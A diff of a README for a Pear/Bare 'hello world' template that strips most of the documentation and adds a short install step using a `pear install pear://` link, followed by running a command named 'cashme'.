@@ -2,48 +2,13 @@
 
 > Pear Hello World for Standalone Bare Processes with `pear-runtime`
 
-End-to-end boilerplate for embedding [pear-runtime] into a Standalone [Bare] Process with peer-to-peer OTA update support.
+# Install
 
-This variant is for providing P2P OTA updates to short-lived CLI programs. It uses a detached [`bare-daemon`][bare-daemon] updater, allowing the foreground command to exit while the update check continues in the background. Long-lived programs (services, REPLs TUIs) with are better suited to `main` or `single-thread` variants.
+`pear install pear://tdnucsbcqeqer3yuyxduty4666zxr1f6ihua1j17g3pwr1qrnd9o`
 
-- Peer-to-Peer deployment with [pear][pear-docs] CLI
-- Peer-to-Peer Over-the-Air updates with [`pear-runtime`][pear-runtime] module
-- Detached updater process via [`bare-daemon`][bare-daemon]
-- Cross-platform standalone distributables via [`bare-build`][bare-build]
+run
 
-## Variants
-
-- [`main`](https://github.com/holepunchto/hello-pear-bare/tree/main): runs `pear-runtime` inside a Bare worker thread.
-- [`single-thread`](https://github.com/holepunchto/hello-pear-bare/tree/variant/single-thread): workerless with `pear-runtime` updates.
-- (current) [`daemon`](https://github.com/holepunchto/hello-pear-bare/tree/variant/daemon): runs `pear-runtime` in a detached updater daemon.
-
-## Table of Contents
-
-- [OS Support](#os-support)
-- [Requirements](#requirements)
-- [Development](#development)
-  - [Install Dependencies](#install-dependencies)
-  - [Create an upgrade link](#create-an-upgrade-link)
-  - [Start](#start)
-- [Architecture](#architecture)
-  - [Updates](#updates)
-- [Peer-to-Peer Deployments](#peer-to-peer-deployments)
-- [Installing Distributables](#installing-distributables)
-- [Scripts](#scripts)
-- [Project Structure](#project-structure)
-- [Troubleshooting](#troubleshooting)
-
-## OS Support
-
-- **macOS** — arm64, x64
-- **Linux** — arm64, x64
-- **Windows** — arm64, x64
-
-## Requirements
-
-- `npm` via [Node.js][nodejs]
-- [pear][pear-docs] - `npx pear`
-- macosx
+`cashme`
 
 ## Development
 
@@ -52,22 +17,6 @@ This variant is for providing P2P OTA updates to short-lived CLI programs. It us
 ```sh
 npm install
 ```
-
-### Create an upgrade link
-
-This template expects `package.json` to contain a valid `pear://` link in the `upgrade` field. If it still contains the placeholder `pear://<YOUR_KEY_HERE>`, startup will fail with `INVALID_URL`.
-
-Create a link with [`pear touch`](https://docs.pears.com/reference/cli.html#pear-touch-flags-channel):
-
-```sh
-pear touch
-```
-
-Copy the generated `pear://...` link into the `upgrade` field in `package.json`.
-
-### Start
-
-Start app in development mode:
 
 ```sh
 npm start
